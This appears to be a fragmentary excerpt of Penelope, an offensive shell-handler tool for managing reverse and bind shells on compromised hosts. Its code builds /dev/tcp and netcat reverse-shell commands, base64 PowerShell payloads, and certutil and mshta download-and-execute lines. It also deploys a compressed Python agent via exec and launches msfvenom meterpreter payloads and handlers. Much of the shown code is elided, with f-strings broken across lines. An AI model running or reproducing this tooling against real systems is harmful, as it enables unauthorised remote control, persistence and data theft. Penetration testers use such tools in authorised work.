...
def rand(_len): return ''.join(random.choice(string.ascii_letters)
                               for i in range(_len))


def caller(): return inspect.stack()[2].function


def bdebug(file, data): return open(
    "/tmp/" + file, "a").write(repr(data) + "\n")


def chunks(string, length): return (
    string[0 + i:length + i] for i in range(0, len(string), length))


def pathlink(filepath): return (
...
class Interfaces:
    def __str__(self):
        """String representation of the interfaces table."""
        return str(self.list)

    def oneLine(self):
        """Compact representation of the interfaces table."""
        return '(' + str(self).replace('\n', '|') + ')'

    def translate(self, interface_name):
        """Translate the interface name if needed (e.g., for aliasing)."""
        return interface_name

    @property
    def list(self):
        """
        Retrieve a dictionary of network interfaces and their associated IPs.

        Supports Linux (using /proc or ip), macOS and BSD (using ifconfig),
        and Windows (using ipconfig).
        """
    ...
    def _list_linux(self):
        """Fetch network interfaces and IPs for Linux."""
        interfaces = defaultdict(list)

        # Try using /proc/net/dev and /proc/net/fib_trie
        try:
            ...
            for interface in interface_names:
                ipv4_pattern = rf"{interface}\n\s+local (\d+\.\d+\.\d+\.\d+)"
                ipv6_pattern = rf"{interface}\n\s+local (\S+::\S+)"
                ipv4_matches = re.findall(ipv4_pattern, fib_trie)
                ipv6_matches = re.findall(ipv6_pattern, fib_trie)

                interfaces[interface].extend(ipv4_matches + ipv6_matches)

            return {iface: ips for iface, ips in interfaces.items() if ips}
        except FileNotFoundError:
            logger.warning(
                "Required /proc files not found. Falling back to 'ip' command.")
        ...
        if shutil.which("ip"):
            try:
                ...
                for line in output.splitlines():
                    ...
                    if interface_match:
                        current_interface = interface_match[1]
                        continue

                    if current_interface:
                        ip_match = re.search(r"inet6? (\S+)", line)
                        if ip_match:
                            interfaces[current_interface].append(ip_match[1])

                return {iface: ips for iface, ips in interfaces.items()}
            except subprocess.CalledProcessError as e:
                logger.error(f"Error executing 'ip addr': {e}")
                return {}
        else:
            logger.error(
                "'ip' command is not available and /proc fallback failed.")
            return {}

    def _list_ifconfig(self):
        """Fetch network interfaces and IPs using the ifconfig command (macOS and BSD)."""
        interfaces = defaultdict(list)
        if shutil.which("ifconfig"):
            try:
                ...
                matches = re.findall(
                    r'^(\w+):.*?\n(?:.*?inet (\d+\.\d+\.\d+\.\d+))?.*?(?:inet6 (\S+))?',
                    output,
                    re.MULTILINE | re.DOTALL
                )
                for interface, ipv4, ipv6 in matches:
                    if ipv4:
                        interfaces[interface].append(ipv4)
                    if ipv6:
                        interfaces[interface].append(ipv6)
                return {iface: ips for iface, ips in interfaces.items()}
            except subprocess.CalledProcessError as e:
                logger.error(f"Error executing 'ifconfig': {e}")
                return {}
        else:
    ...
    def _list_windows(self):
        """Fetch network interfaces and IPs for Windows."""
        interfaces = defaultdict(list)
        try:
            ...
            for line in output.splitlines():
                ...
                if current_interface:
                    ipv4_match = re.search(
                        r"IPv4 Address.*?: (\d+\.\d+\.\d+\.\d+)", line)
                    ipv6_match = re.search(r"IPv6 Address.*?: (\S+)", line)

                    if ipv4_match:
                        interfaces[current_interface].append(ipv4_match[1])
                    if ipv6_match:
                        interfaces[current_interface].append(ipv6_match[1])

            return {iface: ips for iface, ips in interfaces.items() if ips}
        except subprocess.CalledProcessError as e:
            logger.error(f"Error executing 'ipconfig': {e}")
            return {}

    @property
    def list_all(self):
        """
        Return a flattened list of all interface names and IPs.
        Combines interface names and their associated IP addresses.
        """
        interfaces = self.list  # Cache the result of `list`
        if not interfaces:
            return []
        return [
            item
...
class PBar:
    ...
    def render(self):
        ...
        bar_space = self.max_width if self.max_width else os.get_terminal_size().columns - \
            len(left) - len(right)
...
class paint:
    _codes = {'RESET': 0, 'BRIGHT': 1, 'DIM': 2,
              'UNDERLINE': 4, 'BLINK': 5, 'NORMAL': 22}
    _colors = {'black': 0, 'red': 1, 'green': 2, 'yellow': 3,
               'blue': 4, 'magenta': 5, 'cyan': 6, 'white': 231, 'orange': 136}

    def _escape(codes): return f"\001\x1b[{codes}m\002"
    ...
    def __str__(self):
        if self.colors:
            content = self.text + \
                __class__._escape(
                    __class__._codes['RESET']) if self.text is not None else ''
    ...
    def __getattr__(self, attr):
        ...
        for color in attr.split('_'):
            if color in __class__._codes:
                ...
                self.colors.append(prefix + "8;5;" +
                                   str(__class__._colors[color.lower()]))
        return self
...
class CustomFormatter(logging.Formatter):
    ...
    def format(self, record):
        ...
        text = prefix + \
            f"{template['prefix']}{thread} {
                logging.Formatter.format(self, record)}" + suffix
...
class MainMenu(BetterCMD):
    ...
    def set_id(self, ID):
        ...
        session_part = f"{paint('Session').green} {paint('[' + str(self.sid) + ']').red} "\
            if self.sid else ''
        self.prompt = f"{paint(f'┍┽ {__program__} ┾┑').magenta} {
            session_part}> "
    ...
    def show_help(self, command):
        help_prompt = re.compile(
            r"Run 'help [^\']*' for more information")  # TODO
        ...
        if command:
            ...
            for section in self.commands:
                ...
                for command in self.commands[section]:
                    parts = textwrap.dedent(
                        getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
                    table += [paint(command).green,
                              paint(parts[0]).blue, parts[1]]
                print(table)
            print()
            ...
            if core.sessions:
                for host, sessions in core.hosts.items():
                    print('\n➤  ' + OSes[sessions[0].OS] +
                          " " + str(paint(host).RED + ' 💀'))
                    table = Table(joinchar=' | ')
                    table.header = [paint(header).cyan for header in (
                        'ID', 'Shell', 'Source')]
                    for session in sessions:
                        if self.sid == session.id:
                            ID = paint('[' + str(session.id) + ']').red
                        elif session.new:
                            ID = paint('<' + str(session.id) +
                                       '>').yellow_BLINK
                        else:
                            ID = paint(' ' + str(session.id)).yellow
                        source = 'Reverse shell from ' + \
                            str(session.listener) if session.listener else f'Bind shell (port {
                                session.port})'
                        table += [ID, paint(session.type).CYAN if session.type ==
                                  'PTY' else session.type, source]
                    print("\n", textwrap.indent(
                        str(table), "    "), "\n", sep="")
            else:
                print()
    ...
    def do_portfwd(self, line):
        ...
        core.sessions[self.sid].portfwd(
            _type=_type, lhost=lhost, lport=int(lport), rhost=rhost, rport=int(rport))
    ...
    def show_modules(self):
        table = Table(joinchar=' <-> ')
        table.header = [paint('MODULE NAME').cyan_UNDERLINE,
                        paint('DESCRIPTION').cyan_UNDERLINE]
    ...
    def do_maintain(self, line):
        ...
        if line:
            ...
            status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint(
                'Disabled').white_RED
            cmdlogger.info(f"Value set to {paint(
                options.maintain).yellow} {status}")
    ...
    def do_exit(self, line):
        ...
        if __class__.confirm(f"Exit Penelope?{self.active_sessions}"):
            ...
            ) if thread.name not in ('MainThread', 'Menu')]
    ...
    def do_SET(self, line):
        ...
        if not line:
            ...
            table = Table(rows, fillchar=[paint(
                '.').green, 0], joinchar=' => ')
            print(table)
        else:
            try:
                ...
                if len(args) == 1:
                    ...
                    if getattr(options, param) != old_value:
                        cmdlogger.info(f"'{param}' option set to: {
                                       paint(getattr(options, param)).yellow}")
    ...
    def default(self, line):
        if line in ['q', 'quit']:
            ...
            if not candidates:
                cmdlogger.warning(f"No such command: '{
                                  line}'. Issue 'help' for all available commands")
                ...
                cmdlogger.warning(
                    f"Ambiguous command. Can mean any of: {candidates}")
    ...
    def complete_listeners(self, text, line, begidx, endidx):
        ...
        if begidx == 15:
            listeners = [re.search(r'\((.*)\)', str(listener))
                         [1].replace(':', ' ') for listener in core.listeners]
            if len(listeners) > 1:
                listeners.append('*')
                        ...
                        for _type, _value in readable.messenger.feed(data):
                            ...
                            if _type == Messenger.SHELL:
                                ...
                                try:
                                    ...
                                    logger.debug(f"Cannot write to stream; Stream <{
                                                 stream_id}> died prematurely")
                    else:
                        target.write(data)
...
class Listener:
    ...
    def start(self):
        ...
        logger.info(f"Listening for reverse shells on {paint(self.host).blue}{
                    paint(':').red}{paint(self.port).red} {specific}")
    ...
    def hints(self):
        ...
        for ip in ips:
            ...
            output.append("")
            output.append("cmd /c powershell -e " + base64.b64encode(
                presets[1].format(ip, self.port).encode("utf-16le")).decode())
...
class Session:
        ...
        if self.determine():
            ...
            if not options.no_log:
                ...
                if not options.no_timestamps and not self.logpath.exists():
                    self.logfile.write(datetime.now().strftime(
                        paint("%Y-%m-%d %H:%M:%S: ").magenta).encode())
            ...
            attach_conditions = [
                ...
                self.listener and not "Menu" in core.threads and len(
                    core.hosts[self.name]) == options.maintain,
                ...
                not self.listener and "Menu" in core.threads and menu.lastcmd.startswith(
                    'connect')
            ]
    ...
    def __repr__(self):
        return (
            f"ID: {
                self.id} -> {__class__.__name__}({self.name}, {self.OS}, {self.type}, "
            ...
            if Path(self.directory / ".noagent").exists():
                ...
                if _bin:
                    ...
                    major, minor, micro = re.search(
                        r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
                    self.remote_python_version = (
                        int(major), int(minor), int(micro))
                    # Python 2.2 lacks: tarfile, os.walk, yield
                    if self.remote_python_version >= (2, 3):
    ...
    def get_shell_pid(self):
        if self.OS == 'Unix':
            if self.agent:
                self.shell_pid = self.exec(
                    "stdout_stream << str(shell_pid).encode()", python=True, value=True)
            else:
                ...
                if not (isinstance(self.shell_pid, str) and self.shell_pid.isnumeric()):
                    logger.error(
                        "Cannot get the PID of the shell. Response: {self.shell_pid}")
    ...
    def tty(self):
        if self._tty is None:
            try:
                ...
                # TODO check binary
                self._tty = self.exec(
                    f"readlink -f /proc/{self.shell_pid}/fd/0", value=True)
                self.bypass_control_session = False
    ...
    def bsd(self):
        if self._bsd is None:
            ...
            if self.OS == 'Unix':
                try:
                    response = self.control_session.exec(
                        "uname -s", value=True)
        ...
        if self._cwd is None:
            if self.OS == 'Unix':
                if not self.shell_pid:  # TEMP
                    self.get_shell_pid()
                if self.bsd:
                    self._cwd = self.control_session.exec(
                        f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-", value=True)
                elif self.agent:
                    self._cwd = self.exec(
                        f"""
                    try:
                    ...
                    self._cwd = self.control_session.exec(
                        f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
            elif self.OS == 'Windows':
        ...
        if not self._bin:
            try:
                if self.OS == "Unix":
                    ...
                    response = self.exec(f'for i in {" ".join(
                        binaries)}; do which $i 2>/dev/null || echo;done')
                    if response:
                        self._bin = dict(
                            zip(binaries, response.decode().splitlines()))

                    missing = [
                        b for b in binaries if not self._bin[b].startswith("/")]

                    if missing:
                        logger.debug(paint(f"We didn't find the binaries: {
                                     missing}. Trying another method").red)
                        response = self.exec(
                            f'for bin in {" ".join(missing)}; do for dir in '
                            f'{" ".join(LINUX_PATH.split(":"))
                               }; do _bin=$dir/$bin; '  # TODO PATH
        ...
        if self._tmp is None:
            if self.OS == "Unix":
                ...
                for directory in common_dirs:
                    ...
                    candidate_dirs = self.exec(
                        f'find / -type d -writable 2>/dev/null')
                    if candidate_dirs:
                ...
                if not self._tmp:
                    self._tmp = False
                    logger.warning(
                        "Cannot find writable directory on target...")
                else:
                    logger.debug(f"Available writable directory on target: {
                                 paint(self._tmp).RED}")

            elif self.OS == "Windows":
                self._tmp = self.exec(
                    "echo %TEMP%", force_cmd=True, value=True)
    ...
    def log(self, data, _input=False):
        ...
        # Need to include all Clear escape codes
        data = re.sub(rb'\x1b\x63', b'', data)
    ...
    def determine(self, path=False):
        ...
        var_name1, var_name2, var_value1, var_value2 = (
            rand(4) for _ in range(4))
        ...
        response = self.exec(f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${
        ...
        if response:
            ...
            if var_value1 + var_value2 in response:
                ...
                self.version = re.search(
                    rf"Microsoft Windows \[Version (.*)\]", response, re.DOTALL)[1]
            ...
            response = self.exec(f"${var_name1}='{var_value1}'; ${var_name2}='{
                                 var_value2}'; echo ${var_name1}${var_name2}\r\n", raw=True, expect_func=expect)
            if not response:
                return False
            response = response.decode()
            ...
            if var_value1 + var_value2 in response:
                ...
                if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
                    ...
                    cmd = f"$width={columns}; $height={
                        lines}; $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)"
                    self.exec(cmd)
                    self.prompt = response.splitlines()[-2].encode()
                else:
                    self.prompt = re.sub(
                        var_value1.encode() + var_value2.encode(), b"", self.prompt)
        return True
    ...
    def exec(
            ...
            # If true, send cmd via this method but receive with TLV method (agent)
            separate=False,
        # --- Agent only args ---
        ...
        if self.agent and not agent_typing:  # TODO environment will not be the same as shell
            if cmd:
                ...
                self.send(Messenger.message(Messenger.EXEC, _type + stdin_stream.id +
                          stdout_stream.id + stderr_stream.id + cmd.encode()))
        ...
        with self.lock:
            ...
            if cmd is not None:
                ...
                if raw:
                    ...
                    if self.OS == 'Unix':
                        ...
                        if self.subtype == 'cmd':
                            ...
                            cmd = (
                                f"$env:{token[0]}=\"{token[1]}\";$env:{
                                    token[2]}=\"{token[3]}\"\r\n"
                                f"echo $env:{token[0]}$env:{
                                    token[2]};{cmd.decode()};"
                                f"echo $env:{token[2]}$env:{
                                    token[0]}\r\n".encode()
                            )
                        # TODO check the maxlength on powershell
                        if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
                            logger.error(
                                "Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
                            return False
                ...
                logger.debug(f"\n\n{paint(f'Command for session {
                             self.id}').YELLOW}: {initial_cmd}")
            ...
            while self.subchannel.result is None:
                ...
                logger.debug(
                    paint(f"Waiting for data (timeout={timeout})...").blue)
                ...
                if need_check:
                    ...
                    if raw and self.echoing and cmd:
                        ...
                        if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
                            ...
                            continue
                    if not raw:
                        check = self.subchannel.pattern.search(
                            buffer.getvalue())
                        if check:
                            ...
                            break
                        logger.debug(
                            paint('We didn\'t get all data; continue receiving').yellow)
                        ...
                        if expect_func(buffer.getvalue()):
                            ...
                            logger.debug(
                                paint('No expected strings found in data. Receive again...').yellow)
            ...
            logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{
                         self.subchannel.result}")
            self.subchannel.active = False

            if separate and self.subchannel.result:
                self.subchannel.result = re.search(
                    rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
                buffer = io.BytesIO()
    ...
    def _upgrade(self):
        if self.OS == "Unix":
            ...
            if self.need_control_sessions and self.control_sessions == [self]:
                logger.warning(
                    "This is a control session and cannot be upgraded")
                return False
            ...
            if self.type == "PTY":
                if self.can_deploy_agent:
                    ...
                    logger.warning(
                        "This shell is already PTY and Python agent cannot be deployed...")
                    return False
            else:
            ...
            if self.can_deploy_agent:
                ...
                agent = textwrap.dedent('\n'.join(AGENT.splitlines()[1:])).format(
                    self.shell, NET_BUF_SIZE, MESSENGER, STREAM, _exec)
                payload = base64.b64encode(
                    zlib.compress(agent.encode(), 9)).decode()
                cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{
                    _decode}("{payload}")))\''
                ...
                if not self.exec(f"test -f {_bin} || echo x"):
                    cmd = socat_cmd.format(_bin)
                else:
                    logger.warning(
            ...
            if not self.can_deploy_agent and not self.spare_control_sessions:  # TODO
                logger.warning(
                    "Python agent cannot be deployed. I need to maintain at least one basic session...")
                core.session_wait_host = self.name
                self.spawn()
                try:
                    new_session = core.sessions[core.session_wait.get(
            ...
            response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {
                                 cmd}', separate=self.can_deploy_agent, expect_func=expect, raw=True)
            ...
            logger.info(f"Shell upgraded successfully using {
                        paint(_bin).yellow}{paint().green}! 💪")
    ...
    def update_pty_size(self):
        ...
        if self.OS == 'Unix':
            if self.agent:
                self.send(Messenger.message(Messenger.RESIZE,
                          struct.pack("HH", lines, columns)))
            else:  # TODO
                threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {
                                 columns} -F {self.tty}",), name="RESIZE").start()  # TEMP
        ...
        while core.attached_session == self:
            try:
                ...
                try:
                    ...
                    cmdlogger.debug(f"History file '{
                                    self.histfile}' does not exist")
            except EOFError:
                self.detach()
                break
            except AssertionError:
                logger.error(f"Maximum prompt length is {
                             MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
            else:
    ...
    def download(self, remote_items):
        ...
        if self.OS == 'Unix':
            ...
            if need > 0:
                logger.error(
                    f"--- Not enough space to download... {
                        paint('We need ').blue}"
            ...
            if self.agent:
                ...
                cmd = f'tar cz $(for file in {
                    remote_items};do readlink -f "$file";done) | base64 -w0 > {temp}'
                response = self.exec(cmd, timeout=None, value=True)
                if not response:
                    logger.error("Cannot create archive")
                    return []
                errors = [line[5:] for line in response.splitlines()
                          if line.startswith('tar: /')]
                for error in errors:
                    logger.error(error)
                send_size = int(
                    self.exec(rf"stat {temp} | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))
            ...
            if self.agent:
                ...
                cmd = f'for file in {
                    remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo $file; fi; done'
                response = self.exec(cmd, timeout=None, value=True)
                if not response:
            ...
            for path in remote_paths:
                ...
                if os.path.exists(local_path):
                    ...
                    logger.error(
                        f"{paint('Download Failed').RED_white} => {local_path}")
            ...
            cmd = (
                f'@powershell -command "$archivepath=\'{
                    remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
            ...
            server.start()
            data = self.exec(
                f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{
                    temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
            ...
            try:
                with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
                    for item in zipdata.infolist():
                        ...
                        downloaded.add(Path(local_download_folder) /
                                       Path(item.filename.split('/')[0]))
                        newpath = Path(zipdata.extract(
                            item, path=local_download_folder))
        ...
        for item in downloaded:
            logger.info(f"{paint('Downloaded').GREEN_white} => {
                        paint(shlex.quote(pathlink(item))).yellow}")  # PROBLEM with ../ TODO
    ...
    def upload(self, local_items, remote_path=None, randomize_fname=False):
        ...
        if self.OS == 'Unix':
            ...
            if self.agent:
                ...
                stdout_stream << (str(stats.f_bavail) + ';' + \
                                  str(stats.f_frsize)).encode()
                """, python=True, value=True)
                ...
                remote_block_size = int(self.exec(
                    rf"stat {destination}| sed -n 's/.*IO Block: \([0-9]*\).*/\1/p'", value=True))
                remote_space = int(self.exec(
                    f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

            # Calculate local size
            local_size = 0
            for item in resolved_items:
                if isinstance(item, tuple):
                    local_size += ceil(len(item[1]) /
            ...
            tar = tarfile.open(
                mode='w|gz', fileobj=tar_destination, format=tarfile.GNU_FORMAT)
            ...
            for item in resolved_items:
                if isinstance(item, tuple):
                    ...
                    altname = f"{
                        item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
                ...
                for item in resolved_items:
                    if isinstance(item, tuple):
                        ...
                        if randomize_fname:
                            filename = Path(filename)
                            altname = f"{
                                filename.stem}-{rand(8)}{filename.suffix}"
                        else:
                            altname = filename
            ...
            fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{
                urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
            unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{
                tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'
            ...
            response = self.exec(
                f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{
                    temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
                force_cmd=True, value=True, timeout=None)
            server.stop()
            if not response:
        ...
        # Present uploads
        altnames = list(map(lambda x: destination +
                        ('/' if self.OS == 'Unix' else '\\') + x, altnames))

        for item in altnames:
            uploaded_path = shlex.quote(
                str(item)) if self.OS == 'Unix' else f'"{item}"'
            logger.info(f"{paint('Uploaded').GREEN_white} => {
                        paint(uploaded_path).yellow}")
        return altnames

    def script(self, local_script):
        if not self.agent:
            logger.error(
                "This can only be run in python agent mode: Try to 'upgrade' the session first")
            return False
        ...
        try:
            with open(local_script, "rb") as input_file, open(output_file_name, "wb") as output_file:
                ...
                self.exec(program, stdin_src=input_file,
                          stdout_dst=output_file, stderr_dst=output_file)
        except Exception as e:
            logger.error(e)
            return False
        ...
        if self.OS == "Unix":
            if any([self.listener, port, host]):
                ...
                if self.bin['bash']:
                    ...
                    cmd = f'{self.bin["bash"]} -c "nohup {self.bin["bash"]
                                                          } >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'

                elif self.bin['sh']:
                    ncat_cmd = f'{
                        self.bin["sh"]} -c "nohup {{}} -e {self.bin["sh"]} {host} {port} &"'
                ...
                logger.info(
                    f"Attempting to spawn a reverse shell on {host}:{port}")
                self.exec(cmd)
                ...
                logger.info(
                    f"Attempting to spawn a bind shell from {host}:{port}")
    ...
    def kill(self):
        ...
        if thread_name != 'Core':
            if self.need_control_sessions and\
                ...
                sessions = ', '.join([str(session.id)
                                     for session in self.need_control_sessions])
                if thread_name == 'Menu':
                    logger.warning(
                        f"Cannot kill Session {
                            self.id} as the following sessions depend on it: {sessions}"
                    )
                    return False
                else:
                    logger.error(
                        f"Sessions {sessions} need a control session.")
...
class meterpreter(Module):
    ...
    def run(self):
        if self.session.OS == 'Unix':
            ...
            port = 5555
            payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={
                host} LPORT={port} -f exe > {payload_path}"
            ...
            if result.returncode == 0:
                ...
                if uploaded_path:
                    meterpreter_handler_cmd = f'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {
                        host}; set LPORT {port}; run"'
                    Open(meterpreter_handler_cmd, terminal=True)
                    print(meterpreter_handler_cmd)
                    self.session.exec(uploaded_path[0])
            else:
                logger.error(f"Cannot create meterpreter payload: {
                             result.stderr}")
...
class ngrok(Module):
    ...
    def run(self):
        if self.session.OS == 'Unix':
            self.session.upload(
                BINARIES['ngrok_linux'], remote_path=self.session.tmp)
            self.session.exec(
                f"tar xf {self.session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
        ...
        while True:
            if not self.len:
                ...
                self.len = struct.unpack(
                    Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
                ...
                _type = struct.unpack(
                    Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
                    ...
                    for _type, _value in messages:
                        ...
                        if _type == Messenger.SHELL:
                            ...
                            if not stdin_stream_id in streams:
                                streams[stdin_stream_id] = Stream(
                                    stdin_stream_id)
                            if not stdout_stream_id in streams:
                                streams[stdout_stream_id] = Stream(
                                    stdout_stream_id)
                            if not stderr_stream_id in streams:
                                streams[stderr_stream_id] = Stream(
                                    stderr_stream_id)
                            ...
                            if _type == 'S'.encode():
                                ...
                                threading.Thread(target=run, args=(
                                    stdin_stream, stdout_stream, stderr_stream)).start()
...
class FileServer:
    ...
    def hints(self):
        ...
        for ip in ips:
            output.extend(('', '🏠 http://' + str(paint(ip).cyan) +
                          ":" + str(paint(self.port).red) + '/' + self.password))
            table = Table(joinchar=' → ')
            for urlpath, filepath in self.filemap.items():
                table += (paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green +
        ...
        class CustomHandler(http.server.SimpleHTTPRequestHandler):
            ...
            def log_message(self, format, *args):
                ...
                response = message.translate(
                    self._control_char_table).split(' ')
                ...
                logger.info(f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] FileServer({
                            host}:{port}) [{paint(self.address_string()).cyan}] {response}")
    ...
    def __setattr__(self, option, value):
        ...
        if level:
            ...
            if value > self.max_maintain:
                show(f"Maintain value decreased to the max ({
                     self.max_maintain})")
        ...
        if hasattr(self, option) and getattr(self, option) is not None:
            ...
            if new_value_type == orig_value_type:
                ...
                show(f"Wrong value type for '{option}': Expect <{
                     orig_value_type}>, not <{new_value_type}>")
        else:
            self.__dict__[option] = value
...
def url_to_bytes(URL):
    ...
    req = urllib.request.Request(
        URL, headers={'User-Agent': options.useragent})

    logger.info(paint(f"--- ⇣  Downloading {URL}").blue)
    ctx = ssl.create_default_context(
    ) if options.verify_ssl_cert else ssl._create_unverified_context()

    while True:
        try:
            response = urllib.request.urlopen(
                req, context=ctx, timeout=options.short_timeout)
            break
            ...
            if type(e.reason) == ssl.SSLCertVerificationError:
                answer = ask(
                    "Cannot verify SSL Certificate. Download anyway? (y/N)")
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description="Penelope Shell Handler", add_help=False)

    parser.add_argument(
        "ports", nargs='*', help="Ports to listen/connect to, depending on -i/-c options. Default: 4444")

    method = parser.add_argument_group("Reverse or Bind shell?")
    method.add_argument(
        "-i", "--interface", help="Interface or IP address to listen on. Default: 0.0.0.0", metavar='')
    method.add_argument("-c", "--connect", help="Bind shell Host", metavar='')

    hints = parser.add_argument_group("Hints")
    hints.add_argument(
        "-a", "--hints", help="Show sample payloads for reverse shell based on the registered Listeners", action="store_true")
    hints.add_argument("-l", "--interfaces",
                       help="Show the available network interfaces", action="store_true")
    hints.add_argument("-h", "--help", action="help",
                       help="show this help message and exit")

    verbosity = parser.add_argument_group("Verbosity")
    verbosity.add_argument(
        "-Q", "--silent", help="Be a bit less verbose", action="store_true")
    verbosity.add_argument(
        "-d", "--debug", help="Show debug messages", action="store_true")

    log = parser.add_argument_group("Session Logging")
    log.add_argument(
        "-L", "--no-log", help="Do not create session log files", action="store_true")
    log.add_argument("-T", "--no-timestamps",
                     help="Do not include timestamps in session logs", action="store_true")
    log.add_argument("-CT", "--no-colored-timestamps",
                     help="Do not color timestamps in session logs", action="store_true")

    misc = parser.add_argument_group("Misc")
    misc.add_argument("-r", "--configfile",
                      help="Configuration file location", type=Path, metavar='')
    misc.add_argument(
        "-m", "--maintain", help="Maintain NUM total shells per target", type=int, metavar='')
    misc.add_argument("-H", "--no-history",
                      help="Disable shell history on target", action="store_true")
    misc.add_argument(
        "-P", "--plain", help="Just land to the main menu", action="store_true")
    misc.add_argument("-S", "--single-session",
                      help="Accommodate only the first created session", action="store_true")
    misc.add_argument("-C", "--no-attach",
                      help="Disable auto attaching sessions upon creation", action="store_true")
    misc.add_argument("-U", "--no-upgrade",
                      help="Do not upgrade shells", action="store_true")

    misc = parser.add_argument_group("File server")
    misc.add_argument(
        "-s", "--serve", help="HTTP File Server mode", action="store_true")
    misc.add_argument(
        "-p", "--port", help="File Server port. Default: 8000", metavar='')
    misc.add_argument("-pass", "--password",
                      help="URL prefix", type=str, metavar='')

    debug = parser.add_argument_group("Debug")
    debug.add_argument(
        "-N", "--no-bins", help="Simulate binary absence on target (comma separated list)", metavar='')
    debug.add_argument("-v", "--version",
                       help="Show Penelope version", action="store_true")
    ...
    # File Server
        ...
        server = FileServer(*options.ports or '.', port=options.port,
                            host=options.interface, password=options.password)
        if server.filemap:
            server.start()
        else:
